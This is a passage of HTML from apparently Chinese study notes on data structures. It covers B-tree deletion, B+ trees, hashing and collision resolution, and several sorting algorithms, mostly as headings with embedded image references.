                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017000519250.png"
                      alt="image-20241017000519250"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017000543103.png"
                      alt="image-20241017000543103"
                ></p>
<h5 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017000615260.png"
                      alt="image-20241017000615260"
                ></p>
<h4 id="删除操作-1"><a href="#删除操作-1" class="headerlink" title="删除操作"></a>删除操作</h4><h5 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h5><p>1、若被删除关键字在终端节点，则直接删除（注意：不能低于B数要求下限）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017000743507.png"
                      alt="image-20241017000743507"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017000805432.png"
                      alt="image-20241017000805432"
                ></p>
<p>2、若被删除关键字在非终端节点，则用其前驱或者后继来替代其位置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017000933364.png"
                      alt="image-20241017000933364"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017000924229.png"
                      alt="image-20241017000924229"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017000959176.png"
                      alt="image-20241017000959176"
                ></p>
<p><strong>后继</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017001035943.png"
                      alt="image-20241017001035943"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017001101355.png"
                      alt="image-20241017001101355"
                ></p>
<p>3、若被删除关键字在终端节点，且此时低于B树下限，则拉父提兄（将父节点拉下来，兄弟节点提上去）</p>
<h6 id="拉右兄弟"><a href="#拉右兄弟" class="headerlink" title="拉右兄弟"></a>拉右兄弟</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017001337664.png"
                      alt="image-20241017001337664"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017001345969.png"
                      alt="image-20241017001345969"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017001402995.png"
                      alt="image-20241017001402995"
                ></p>
<h6 id="拉左兄弟"><a href="#拉左兄弟" class="headerlink" title="拉左兄弟"></a>拉左兄弟</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017001642875.png"
                      alt="image-20241017001642875"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017001655227.png"
                      alt="image-20241017001655227"
                ></p>
<p>4、若被删除关键字在终端节点，且兄弟都不富裕，则进行合并操作</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017002033596.png"
                      alt="image-20241017002033596"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017002052910.png"
                      alt="image-20241017002052910"
                ></p>
<p><strong>合并操作</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017002134567.png"
                      alt="image-20241017002134567"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017002205170.png"
                      alt="image-20241017002205170"
                ></p>
<p><strong>若合并拉父后，父节点不满足B树，则继续进行拉父提兄，若兄依旧不足，则同样进行合并操作</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017002329095.png"
                      alt="image-20241017002329095"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017002345193.png"
                      alt="image-20241017002345193"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017002358598.png"
                      alt="image-20241017002358598"
                ></p>
<p><strong>小总结</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017002439058.png"
                      alt="image-20241017002439058"
                ></p>
<h4 id="插入删除操作总结"><a href="#插入删除操作总结" class="headerlink" title="插入删除操作总结"></a>插入删除操作总结</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017001910348.png"
                      alt="image-20241017001910348"
                ></p>
<hr>
<h3 id="B-树"><a href="#B-树" class="headerlink" title="B+树"></a>B+树</h3><h4 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h4><p>类似于分块查找</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017003151571.png"
                      alt="image-20241017003151571"
                ></p>
<h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><h5 id="多路查找"><a href="#多路查找" class="headerlink" title="多路查找"></a>多路查找</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017003311320.png"
                      alt="image-20241017003311320"
                ></p>
<h5 id="顺序查找-1"><a href="#顺序查找-1" class="headerlink" title="顺序查找"></a>顺序查找</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017003404496.png"
                      alt="image-20241017003404496"
                ></p>
<h4 id="对比B树"><a href="#对比B树" class="headerlink" title="对比B树"></a>对比B树</h4><h5 id="关键字对应分叉不同"><a href="#关键字对应分叉不同" class="headerlink" title="关键字对应分叉不同"></a>关键字对应分叉不同</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017003720421.png"
                      alt="image-20241017003720421"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017003756331.png"
                      alt="image-20241017003756331"
                ></p>
<h5 id="节点关键字范围不同"><a href="#节点关键字范围不同" class="headerlink" title="节点关键字范围不同"></a>节点关键字范围不同</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017003810669.png"
                      alt="image-20241017003810669"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017003821400.png"
                      alt="image-20241017003821400"
                ></p>
<h5 id="叶子结点与关键字的关系"><a href="#叶子结点与关键字的关系" class="headerlink" title="叶子结点与关键字的关系"></a>叶子结点与关键字的关系</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017003912731.png"
                      alt="image-20241017003912731"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017003925235.png"
                      alt="image-20241017003925235"
                ></p>
<h5 id="节点作用"><a href="#节点作用" class="headerlink" title="节点作用"></a>节点作用</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017003951671.png"
                      alt="image-20241017003951671"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017004004516.png"
                      alt="image-20241017004004516"
                ></p>
<h5 id="存储本质区别"><a href="#存储本质区别" class="headerlink" title="存储本质区别"></a>存储本质区别</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017004346727.png"
                      alt="image-20241017004346727"
                ></p>
<h4 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017004425394.png"
                      alt="image-20241017004425394"
                ></p>
<hr>
<h3 id="散列查找（空间换时间）"><a href="#散列查找（空间换时间）" class="headerlink" title="散列查找（空间换时间）"></a>散列查找（空间换时间）</h3><h4 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017004549079.png"
                      alt="image-20241017004549079"
                ></p>
<h4 id="散列函数"><a href="#散列函数" class="headerlink" title="散列函数"></a>散列函数</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017004703834.png"
                      alt="image-20241017004703834"
                ></p>
<h4 id="ASL-7"><a href="#ASL-7" class="headerlink" title="ASL"></a>ASL</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017005207221.png"
                      alt="image-20241017005207221"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017005356091.png"
                      alt="image-20241017005356091"
                ></p>
<h4 id="装填因子"><a href="#装填因子" class="headerlink" title="装填因子"></a>装填因子</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017005505987.png"
                      alt="image-20241017005505987"
                ></p>
<h4 id="常见散列函数设计方法（哈希函数）"><a href="#常见散列函数设计方法（哈希函数）" class="headerlink" title="常见散列函数设计方法（哈希函数）"></a>常见散列函数设计方法（哈希函数）</h4><h5 id="除留余数法"><a href="#除留余数法" class="headerlink" title="除留余数法"></a>除留余数法</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017005938195.png"
                      alt="image-20241017005938195"
                ></p>
<h5 id="直接定址法"><a href="#直接定址法" class="headerlink" title="直接定址法"></a>直接定址法</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017010055682.png"
                      alt="image-20241017010055682"
                ></p>
<h5 id="数字分析法"><a href="#数字分析法" class="headerlink" title="数字分析法"></a>数字分析法</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017010139572.png"
                      alt="image-20241017010139572"
                ></p>
<h5 id="平方取中法"><a href="#平方取中法" class="headerlink" title="平方取中法"></a>平方取中法</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017010323937.png"
                      alt="image-20241017010323937"
                ></p>
<h4 id="处理冲突方法"><a href="#处理冲突方法" class="headerlink" title="处理冲突方法"></a>处理冲突方法</h4><h5 id="拉链法"><a href="#拉链法" class="headerlink" title="拉链法"></a>拉链法</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017004733011.png"
                      alt="image-20241017004733011"
                ></p>
<h5 id="开放定址法"><a href="#开放定址法" class="headerlink" title="开放定址法"></a>开放定址法</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017010633101.png"
                      alt="image-20241017010633101"
                ></p>
<h6 id="线性探测法"><a href="#线性探测法" class="headerlink" title="线性探测法"></a>线性探测法</h6><p><strong>探测该位置后续位置是否有冲突</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017010816319.png"
                      alt="image-20241017010816319"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017011736753.png"
                      alt="image-20241017011736753"
                ></p>
<p><strong>查找操作</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017011853919.png"
                      alt="image-20241017011853919"
                ></p>
<p><strong>删除操作</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017011813942.png"
                      alt="image-20241017011813942"
                ></p>
<h6 id="平方探测法"><a href="#平方探测法" class="headerlink" title="平方探测法"></a>平方探测法</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017012101117.png"
                      alt="image-20241017012101117"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017012133495.png"
                      alt="image-20241017012133495"
                ></p>
<h6 id="伪随机序列法"><a href="#伪随机序列法" class="headerlink" title="伪随机序列法"></a>伪随机序列法</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017012324271.png"
                      alt="image-20241017012324271"
                ></p>
<h5 id="再散列法（再哈希法）"><a href="#再散列法（再哈希法）" class="headerlink" title="再散列法（再哈希法）"></a>再散列法（再哈希法）</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017012436895.png"
                      alt="image-20241017012436895"
                ></p>
<h4 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241017012636241.png"
                      alt="image-20241017012636241"
                ></p>
<hr>
<h2 id="排序算法与数据结构"><a href="#排序算法与数据结构" class="headerlink" title="排序算法与数据结构"></a>排序算法与数据结构</h2><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><h4 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h4><p>将每个元素前面的所有更大的元素往后移，将该元素移到比该元素大的元素的最前面，即逐次前移</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241018002246997.png"
                      alt="image-20241018002246997"
                ></p>
<h4 id="代码实现-9"><a href="#代码实现-9" class="headerlink" title="代码实现"></a>代码实现</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241018002511098.png"
                      alt="image-20241018002511098"
                ></p>
<p><strong>也可以带哨兵</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241018002553794.png"
                      alt="image-20241018002553794"
                ></p>
<h4 id="时间复杂度-5"><a href="#时间复杂度-5" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241018003002098.png"
                      alt="image-20241018003002098"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241018003047727.png"
                      alt="image-20241018003047727"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241018003057259.png"
                      alt="image-20241018003057259"
                ></p>
<h4 id="优化——折半查找"><a href="#优化——折半查找" class="headerlink" title="优化——折半查找"></a>优化——折半查找</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241018003233796.png"
                      alt="image-20241018003233796"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241018003408680.png"
                      alt="image-20241018003408680"
                ></p>
<h5 id="优化代码实现"><a href="#优化代码实现" class="headerlink" title="优化代码实现"></a>优化代码实现</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241018003628460.png"
                      alt="image-20241018003628460"
                ></p>
<h5 id="时间复杂度-6"><a href="#时间复杂度-6" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241018003649640.png"
                      alt="image-20241018003649640"
                ></p>
<h4 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241018003740405.png"
                      alt="image-20241018003740405"
                ></p>
<hr>
<h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><h4 id="定义-4"><a href="#定义-4" class="headerlink" title="定义"></a>定义</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020173527781.png"
                      alt="image-20241020173527781"
                ></p>
<h4 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h4><p>1、对一个序列进行排序，加入一个增量d，进行多趟排序，d表示两个元素之间的距离</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020173612489.png"
                      alt="image-20241020173612489"
                ></p>
<p>2、进行第一趟排序，找到增量对应的子表，对每一个子表进行一次插入排序</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020173710727.png"
                      alt="image-20241020173710727"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020173752141.png"
                      alt="image-20241020173752141"
                ></p>
<p>2、进行第二趟处理</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020173832119.png"
                      alt="image-20241020173832119"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020173841981.png"
                      alt="image-20241020173841981"
                ></p>
<p>3、进行第3趟处理</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020173857632.png"
                      alt="image-20241020173857632"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020173911992.png"
                      alt="image-20241020173911992"
                ></p>
<p><strong>综合</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020173938544.png"
                      alt="image-20241020173938544"
                ></p>
<h4 id="代码实现-10"><a href="#代码实现-10" class="headerlink" title="代码实现"></a>代码实现</h4><p>从中间往后选择元素，并选择在其之前的子表</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020174058044.png"
                      alt="image-20241020174058044"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020174141470.png"
                      alt="image-20241020174141470"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020174151976.png"
                      alt="image-20241020174151976"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020174241603.png"
                      alt="image-20241020174241603"
                ></p>
<h4 id="时间复杂度与空间复杂度"><a href="#时间复杂度与空间复杂度" class="headerlink" title="时间复杂度与空间复杂度"></a>时间复杂度与空间复杂度</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020174451785.png"
                      alt="image-20241020174451785"
                ></p>
<h4 id="稳定性与适用性"><a href="#稳定性与适用性" class="headerlink" title="稳定性与适用性"></a>稳定性与适用性</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020174538889.png"
                      alt="image-20241020174538889"
                ></p>
<h4 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020174557762.png"
                      alt="image-20241020174557762"
                ></p>
<hr>
<h3 id="交换排序"><a href="#交换排序" class="headerlink" title="交换排序"></a>交换排序</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><h5 id="原理-11"><a href="#原理-11" class="headerlink" title="原理"></a>原理</h5><p>每一趟都两两比较互换位置，每一次选出一个最小（最大）的数，需要进行n-1趟，每一趟需要比较（n-当前趟次）的数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020174700091.png"
                      alt="image-20241020174700091"
                ></p>
<h5 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020174906709.png"
                      alt="image-20241020174906709"
                ></p>
<h5 id="时间复杂度与空间复杂度-1"><a href="#时间复杂度与空间复杂度-1" class="headerlink" title="时间复杂度与空间复杂度"></a>时间复杂度与空间复杂度</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020175502397.png"
                      alt="image-20241020175502397"
                ></p>
<h5 id="总结-9"><a href="#总结-9" class="headerlink" title="总结"></a>总结</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020175544566.png"
                      alt="image-20241020175544566"
                ></p>
<h4 id="快速排序（最快）"><a href="#快速排序（最快）" class="headerlink" title="快速排序（最快）"></a>快速排序（最快）</h4><h5 id="定义-5"><a href="#定义-5" class="headerlink" title="定义"></a>定义</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020175644250.png"
                      alt="image-20241020175644250"
                ></p>
<h5 id="原理-12"><a href="#原理-12" class="headerlink" title="原理"></a>原理</h5><p><strong>选择每一块的基准进行递归排序，基准元素一般选取子表的第一个元素</strong></p>
<p>1、选择基准，将其他数进行左右分配</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241020175754458.png"
                      alt="image-20241020175754458"
                ></p>
<p>2、当low、high指针相遇，确定基准元素位置</p>
